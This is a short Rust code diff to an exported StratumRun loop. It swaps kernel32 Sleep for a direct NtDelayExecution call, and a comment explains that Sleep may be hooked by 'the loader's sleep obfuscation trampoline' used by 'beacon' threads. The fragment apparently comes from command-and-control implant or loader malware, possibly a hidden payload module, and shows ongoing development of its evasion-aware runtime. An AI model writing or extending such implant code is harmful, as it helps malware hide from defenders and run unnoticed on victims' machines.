@@ -529,7 +529,13 @@ pub unsafe extern "system" fn StratumRun(
 
     let mut tick: u32 = 0;
     loop {
-        Sleep(60_000);
+        // Use NtDelayExecution directly — kernel32!Sleep may be hooked by the loader's
+        // sleep obfuscation trampoline, which corrupts context for non-beacon threads.
+        unsafe {
+            let mut interval: i64 = -600_000_000; // 60s in 100ns units, negative = relative
+            extern "system" { fn NtDelayExecution(alertable: u8, interval: *mut i64) -> i32; }
+            NtDelayExecution(0, &mut interval);
+        }
         tick += 1;
         // Log every minute so we know StratumRun loop is still alive
         #[cfg(stratum_debug)]
